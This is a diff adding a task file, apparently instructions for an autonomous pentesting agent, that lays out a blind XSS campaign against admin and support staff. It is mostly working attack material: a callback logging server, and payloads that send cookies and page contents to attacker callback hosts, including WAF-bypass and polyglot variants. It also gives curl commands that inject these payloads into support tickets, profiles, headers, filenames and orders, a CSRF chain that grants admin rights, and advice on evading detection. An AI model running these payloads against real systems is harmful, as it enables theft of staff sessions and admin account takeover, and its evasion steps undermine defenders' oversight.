@@ -1,0 +1,558 @@
+================================================================================
+TASK 56 · BLIND XSS CAMPAIGN (XSS Hunter + Admin-Triggered)
+================================================================================
+Hunt for XSS vulnerabilities that trigger when admins/support staff view 
+user-submitted data. Uses out-of-band callbacks to detect execution.
+
+OBJECTIVE:
+- Inject blind XSS payloads in all admin-visible input fields
+- Set up callback infrastructure to capture executions
+- Target support tickets, feedback forms, user profiles, logs
+- Detect XSS that only triggers in admin/internal panels
+
+================================================================================
+INPUTS
+================================================================================
+outputs/live_base_urls.txt                  ← Target hosts
+outputs/queue_dynamic_endpoints_urls.txt    ← Endpoints with params
+Previous task findings on input fields and forms
+
+================================================================================
+OUTPUTS
+================================================================================
+outputs/blind_xss_injections.txt            ← All injection points used
+outputs/blind_xss_callbacks.txt             ← Received callback details
+outputs/blind_xss_confirmed.txt             ← Confirmed blind XSS
+temp/agent1/bxss_payloads_used.txt          ← Payloads injected with tracking IDs
+
+================================================================================
+PHASE 1: CALLBACK INFRASTRUCTURE SETUP
+================================================================================
+
+───────────────────────────────────────
+1.1 Option A: XSS Hunter (Recommended)
+───────────────────────────────────────
+XSS Hunter = Purpose-built blind XSS platform with dashboard.
+
+# Self-hosted XSS Hunter setup (xsshunter-express)
+git clone https://github.com/mandatoryprogrammer/xsshunter-express.git
+cd xsshunter-express
+# Follow setup instructions for your VPS
+
+# Or use existing XSS Hunter service (if available)
+# Your payload domain: YOUR_SUBDOMAIN.xss.ht
+
+Payload format:
+"><script src=https://YOUR_SUBDOMAIN.xss.ht></script>
+
+XSS Hunter captures:
+- URL where XSS fired
+- DOM snapshot
+- Cookies (if not httpOnly)
+- Screenshot of page
+- User-Agent
+- Origin IP
+
+───────────────────────────────────────
+1.2 Option B: BXSS (Blind XSS framework)
+───────────────────────────────────────
+# Install BXSS
+git clone https://github.com/LewisArdern/bXSS.git
+cd bXSS
+npm install
+npm start
+
+# Configure callback server in config.js
+
+───────────────────────────────────────
+1.3 Option C: Interactsh (Simple OOB)
+───────────────────────────────────────
+Already running from previous tasks:
+
+# Start interactsh if not running
+interactsh-client -v
+
+# Note your callback domain: xyz123.oast.fun
+
+# Generate XSS callback payload
+"><img src=x onerror=fetch('https://xyz123.oast.fun/xss?c='+document.cookie)>
+
+───────────────────────────────────────
+1.4 Custom Callback Server (Maximum Data)
+───────────────────────────────────────
+# Simple Python callback logger
+cat > /tmp/bxss_server.py << 'EOF'
+from http.server import HTTPServer, BaseHTTPRequestHandler
+import urllib.parse
+import datetime
+
+class Handler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        log_entry = f"""
+========== BLIND XSS CALLBACK ==========
+Time: {datetime.datetime.now()}
+Path: {self.path}
+Client: {self.client_address}
+Headers: {dict(self.headers)}
+Query: {urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)}
+=========================================
+"""
+        print(log_entry)
+        with open('bxss_callbacks.log', 'a') as f:
+            f.write(log_entry)
+        self.send_response(200)
+        self.end_headers()
+        
+    def do_POST(self):
+        content_length = int(self.headers.get('Content-Length', 0))
+        body = self.rfile.read(content_length).decode()
+        log_entry = f"""
+========== BLIND XSS CALLBACK (POST) ==========
+Time: {datetime.datetime.now()}
+Path: {self.path}
+Body: {body}
+===============================================
+"""
+        print(log_entry)
+        with open('bxss_callbacks.log', 'a') as f:
+            f.write(log_entry)
+        self.send_response(200)
+        self.end_headers()
+
+HTTPServer(('0.0.0.0', 8888), Handler).serve_forever()
+EOF
+
+python3 /tmp/bxss_server.py &
+
+================================================================================
+PHASE 2: BLIND XSS PAYLOADS
+================================================================================
+
+───────────────────────────────────────
+2.1 Core Callback Payloads
+───────────────────────────────────────
+Replace CALLBACK with your XSS Hunter/Interactsh domain:
+
+# Basic script injection
+"><script src=https://CALLBACK/probe.js></script>
+
+# Image onerror (evades some filters)
+"><img src=x onerror=this.src='https://CALLBACK/?c='+document.cookie>
+
+# Fetch-based (modern, reliable)
+"><img src=x onerror="fetch('https://CALLBACK/x?'+document.cookie)">
+
+# With URL capture
+"><img src=x onerror="fetch('https://CALLBACK/?u='+encodeURIComponent(location.href)+'&c='+document.cookie)">
+
+# With DOM capture (full page)
+"><img src=x onerror="fetch('https://CALLBACK/',{method:'POST',body:document.body.innerHTML})">
+
+───────────────────────────────────────
+2.2 Stealth Payloads (Avoid Detection)
+───────────────────────────────────────
+# Hidden in img style
+<img src=x hidden onerror=fetch('https://CALLBACK/')>
+
+# Delayed execution (bypass timing checks)
+"><img src=x onerror="setTimeout(()=>fetch('https://CALLBACK/'),3000)">
+
+# Invisible element
+<div style="position:absolute;left:-9999px"><script src=https://CALLBACK/></script></div>
+
+───────────────────────────────────────
+2.3 Encoded Payloads (WAF Bypass)
+───────────────────────────────────────
+# HTML entity encoded
+&quot;&gt;&lt;script src=https://CALLBACK/&gt;&lt;/script&gt;
+
+# Unicode escape
+\u0022\u003e\u003cscript src=https://CALLBACK/\u003e\u003c/script\u003e
+
+# Base64 in eval
+"><img src=x onerror=eval(atob('ZmV0Y2goJ2h0dHBzOi8vQ0FMTEJBQ0svJyk='))>
+
+───────────────────────────────────────
+2.4 Polyglot Payloads (Multi-Context)
+───────────────────────────────────────
+# Works in HTML and JS contexts
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcLiCk=fetch('https://CALLBACK/') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=fetch('https://CALLBACK/')//>\x3e
+
+# Shorter polyglot
+'"><img src=x onerror=fetch('https://CALLBACK/')>
+
+───────────────────────────────────────
+2.5 XSS Hunter Specific Payloads
+───────────────────────────────────────
+# Full featured payload (auto-generated by XSS Hunter)
+"><script src="https://YOUR_ID.xss.ht"></script>
+
+# Shortened version
+"><script/src=//YOUR_ID.xss.ht>
+
+# SVG variant
+"><svg onload=import('https://YOUR_ID.xss.ht')>
+
+================================================================================
+PHASE 3: HIGH-VALUE INJECTION TARGETS
+================================================================================
+Where admins/support are MOST LIKELY to view user input.
+
+───────────────────────────────────────
+3.1 Support/Contact Forms (HIGHEST PRIORITY)
+───────────────────────────────────────
+Support tickets are viewed by internal staff → prime blind XSS target.
+
+# Find contact/support forms
+grep -iE "(contact|support|help|ticket|feedback|report)" temp/agent1/url_corpus_all_in_scope.txt
+
+Inject in ALL fields:
+- Subject line
+- Message body
+- Name/email fields
+- File attachment names
+- Any metadata fields
+
+# Example injection
+curl -X POST "https://target.com/support/ticket" \
+    -H "Content-Type: application/json" \
+    -d '{
+        "subject": "\"><script src=https://CALLBACK/support-subject></script>",
+        "message": "Hello support team\"><script src=https://CALLBACK/support-body></script>",
+        "name": "\"><img src=x onerror=fetch(\"https://CALLBACK/support-name\")>",
+        "email": "test@test.com\"><script src=https://CALLBACK/support-email></script>"
+    }'
+
+───────────────────────────────────────
+3.2 User Profile Fields
+───────────────────────────────────────
+Admins reviewing user accounts often see profile data.
+
+# Update profile with payloads
+curl -X PUT "https://target.com/api/profile" \
+    -H "Cookie: session=YOUR_SESSION" \
+    -H "Content-Type: application/json" \
+    -d '{
+        "display_name": "\"><script src=https://CALLBACK/profile-name></script>",
+        "bio": "Hello\"><script src=https://CALLBACK/profile-bio></script>",
+        "website": "https://example.com\"><script src=https://CALLBACK/profile-website></script>",
+        "location": "\"><img src=x onerror=fetch(\"https://CALLBACK/profile-location\")>"
+    }'
+
+───────────────────────────────────────
+3.3 User-Agent / Referer Headers
+───────────────────────────────────────
+Often logged and viewed in admin panels/analytics.
+
+# Inject via User-Agent
+curl "https://target.com/any/page" \
+    -H "User-Agent: \"><script src=https://CALLBACK/ua></script>" \
+    -H "Referer: https://attacker.com\"><script src=https://CALLBACK/referer></script>"
+
+# Inject via X-Forwarded-For (sometimes logged)
+curl "https://target.com/any/page" \
+    -H "X-Forwarded-For: \"><script src=https://CALLBACK/xff></script>"
+
+───────────────────────────────────────
+3.4 Error/Bug Reports
+───────────────────────────────────────
+# If app has error reporting feature
+curl -X POST "https://target.com/api/error-report" \
+    -d 'error_message=\"><script src=https://CALLBACK/error></script>'
+    
+# Stack trace fields
+curl -X POST "https://target.com/api/feedback" \
+    -d 'stacktrace=Error at line 1\"><script src=https://CALLBACK/stack></script>'
+
+───────────────────────────────────────
+3.5 Comments / Reviews
+───────────────────────────────────────
+# Post comment with payload
+curl -X POST "https://target.com/api/comments" \
+    -H "Cookie: session=YOUR_SESSION" \
+    -d 'comment=Great product!\"><script src=https://CALLBACK/comment></script>'
+
+# Reviews
+curl -X POST "https://target.com/api/reviews" \
+    -d 'title=\"><script src=https://CALLBACK/review-title></script>&body=Nice!\"><script src=https://CALLBACK/review-body></script>'
+
+───────────────────────────────────────
+3.6 File Upload Names
+───────────────────────────────────────
+# Upload file with XSS in filename
+# Filename: "><script src=https://CALLBACK/filename></script>.jpg
+
+curl -X POST "https://target.com/api/upload" \
+    -F 'file=@/tmp/test.jpg;filename="><script src=https://CALLBACK/filename></script>.jpg'
+
+───────────────────────────────────────
+3.7 Account Registration
+───────────────────────────────────────
+# Register new account with payloads
+curl -X POST "https://target.com/api/register" \
+    -d 'username=\"><script src=https://CALLBACK/username></script>&email=test@test.com&password=Test1234!'
+
+───────────────────────────────────────
+3.8 Search Queries (Logged)
+───────────────────────────────────────
+# Search queries often logged for analytics
+curl "https://target.com/search?q=%22%3E%3Cscript%20src=https://CALLBACK/search%3E%3C/script%3E"
+
+───────────────────────────────────────
+3.9 Order/Transaction Notes
+───────────────────────────────────────
+# E-commerce: order notes viewed by fulfillment staff
+curl -X POST "https://target.com/api/order" \
+    -H "Cookie: session=YOUR_SESSION" \
+    -d 'notes=Please gift wrap\"><script src=https://CALLBACK/order-note></script>'
+
+================================================================================
+PHASE 4: SYSTEMATIC INJECTION CAMPAIGN
+================================================================================
+
+───────────────────────────────────────
+4.1 Create Tracking ID for Each Injection
+───────────────────────────────────────
+Track which injection point triggered:
+
+# Generate unique ID per injection
+BXSS_ID="bxss-$(date +%s)"
+
+# Use in payload
+"><script src=https://CALLBACK/$BXSS_ID-support-subject></script>
+
+This way when callback received, you know exactly where it fired.
+
+───────────────────────────────────────
+4.2 Injection Tracking Script
+───────────────────────────────────────
+#!/bin/bash
+# blind_xss_inject.sh
+
+CALLBACK="YOUR_CALLBACK_DOMAIN"
+LOG_FILE="temp/agent1/bxss_payloads_used.txt"
+
+inject_payload() {
+    local target="$1"
+    local field="$2"
+    local id="bxss-$(date +%s%N | md5sum | head -c8)"
+    
+    local payload="\"><script src=https://$CALLBACK/$id-$field></script>"
+    
+    echo "$id | $target | $field | $(date)" >> $LOG_FILE
+    echo "$payload"
+}
+
+# Example usage:
+# payload=$(inject_payload "https://target.com/support" "subject")
+# curl -X POST "https://target.com/support" -d "subject=$payload"
+
+───────────────────────────────────────
+4.3 Mass Injection via Dalfox
+───────────────────────────────────────
+Dalfox supports blind XSS mode:
+
+# Run with blind callback
+cat outputs/queue_dynamic_endpoints_urls.txt | dalfox pipe \
+    -b "https://YOUR_CALLBACK_DOMAIN" \
+    --skip-bav \
+    -o temp/agent1/dalfox_blind_results.txt
+
+───────────────────────────────────────
+4.4 XSStrike Blind Mode
+───────────────────────────────────────
+python3 xsstrike.py -u "https://target.com/feedback?msg=test" \
+    --blind \
+    --skip
+
+================================================================================
+PHASE 5: CALLBACK MONITORING
+================================================================================
+
+───────────────────────────────────────
+5.1 Monitor Interactsh
+───────────────────────────────────────
+# Keep interactsh running and watch for callbacks
+interactsh-client -v
+
+# Look for HTTP/DNS callbacks
+# Note: XSS callbacks will show HTTP requests to your domain
+
+───────────────────────────────────────
+5.2 Monitor XSS Hunter Dashboard
+───────────────────────────────────────
+# If using XSS Hunter, check dashboard regularly
+# https://xsshunter.com/dashboard (or self-hosted URL)
+
+Captured data includes:
+- Full URL where XSS fired
+- Screenshot of admin panel
+- DOM snapshot
+- Cookies captured
+- User-Agent of victim
+
+───────────────────────────────────────
+5.3 Expected Timing
+───────────────────────────────────────
+Blind XSS may take time to trigger:
+
+- Support tickets: Hours to days (when support reviews)
+- User reports: 1-7 days
+- Analytics logs: When admin checks dashboard
+- Error logs: During debugging sessions
+
+PATIENCE IS KEY - keep callback server running.
+
+───────────────────────────────────────
+5.4 Log All Callbacks
+───────────────────────────────────────
+# Save all received callbacks
+echo "=== Blind XSS Callbacks ===" > outputs/blind_xss_callbacks.txt
+
+# When callback received, log:
+# - Timestamp
+# - Callback URL (contains tracking ID)
+# - Source IP
+# - Headers received
+# - Any exfiltrated data (cookies, DOM)
+
+================================================================================
+PHASE 6: ADVANCED BLIND XSS TECHNIQUES
+================================================================================
+
+───────────────────────────────────────
+6.1 Email-Based Blind XSS
+───────────────────────────────────────
+Some admin panels render email content as HTML:
+
+# Registration confirmation emails
+# Password reset emails with user input
+# Notification emails with user data
+
+Test by including payload in:
+- Username during registration
+- Email signature fields
+- Display name
+
+───────────────────────────────────────
+6.2 PDF Generation Blind XSS
+───────────────────────────────────────
+If app generates PDFs from user input (invoices, reports):
+
+# Invoice generation
+curl -X POST "https://target.com/api/generate-invoice" \
+    -d 'customer_name=\"><script src=https://CALLBACK/pdf></script>'
+
+PDF libraries (wkhtmltopdf, Chrome headless) execute JS!
+
+───────────────────────────────────────
+6.3 Internal Tool Injection
+───────────────────────────────────────
+Target internal admin tools:
+
+- CRM systems (when staff view customer records)
+- Ticketing systems (Zendesk, Jira, ServiceNow)
+- Monitoring dashboards (viewing error logs)
+- Analytics platforms (user session replays)
+
+───────────────────────────────────────
+6.4 Chain with CSRF
+───────────────────────────────────────
+Once blind XSS triggers in admin panel:
+
+# Payload that performs admin action
+"><script>
+fetch('/admin/users/123/make-admin', {
+    method: 'POST',
+    credentials: 'include'
+});
+</script>
+
+================================================================================
+PHASE 7: OUTPUT CONSOLIDATION
+================================================================================
+
+───────────────────────────────────────
+7.1 Document All Injections
+───────────────────────────────────────
+cat temp/agent1/bxss_payloads_used.txt | \
+    sort -u > outputs/blind_xss_injections.txt
+
+───────────────────────────────────────
+7.2 Confirmed Blind XSS
+───────────────────────────────────────
+When callbacks received:
+
+echo "=== Confirmed Blind XSS ===" > outputs/blind_xss_confirmed.txt
+
+For each callback:
+- Tracking ID → lookup injection point
+- Document: Target URL, field, payload used
+- Impact: What admin context? Cookies captured?
+- Screenshot from XSS Hunter (if available)
+
+================================================================================
+🧠 YOU ARE AN INTELLIGENT AGENT 🧠
+================================================================================
+Blind XSS requires STRATEGIC THINKING, not just mass injection.
+
+OBSERVE:
+- What kind of application is this? (SaaS, e-commerce, banking)
+- Who are the internal users? (support, admins, developers)
+- What data do users submit that staff would view?
+
+THINK LIKE AN ADMIN:
+- Where would a support agent see user data?
+- What fields appear in admin dashboards?
+- When reviewing a ticket, what's displayed?
+
+PRIORITIZE INJECTION POINTS:
+1. Support tickets (staff WILL read these)
+2. Bug reports / feedback (developers read these)
+3. User-Agent headers (appear in analytics)
+4. Profile fields (appear in user management)
+5. File names (appear in upload managers)
+
+BE PATIENT:
+- Blind XSS may take DAYS to trigger
+- Keep your callback server running
+- Check logs daily
+
+THINK ABOUT IMPACT:
+- Admin panel XSS → full account takeover
+- Can you chain with CSRF for admin actions?
+- Can you exfiltrate admin session cookies?
+
+EVADE DETECTION:
+- Use subtle payloads that don't break UI
+- Spread injections over time (don't flood)
+- Use different tracking IDs to identify source
+
+================================================================================
+SUCCESS CRITERIA
+================================================================================
+✓ Callback infrastructure (XSS Hunter/Interactsh) set up and running
+✓ All high-value injection points identified
+✓ Payloads injected in support/contact forms
+✓ Payloads in user profile fields
+✓ Payloads in headers (User-Agent, Referer)
+✓ Payloads in file upload names
+✓ Tracking IDs used for all injections
+✓ Callbacks monitored continuously
+✓ Any triggered XSS documented with full context
+
+================================================================================
+TIMELINE NOTE
+================================================================================
+Unlike reflected XSS (instant), blind XSS requires:
+- Injections completed: Day 1
+- Monitor period: Days 1-14+
+- Staff activity triggers callbacks: Variable
+
+Keep callback server running for at least 2 weeks after injection campaign.
+
+================================================================================
+NEXT STEPS
+================================================================================
+→ If blind XSS confirmed → Document impact, escalate to RCE if possible
+→ Proceed to Task 57+ for other client-side attacks (DOM, Prototype Pollution)
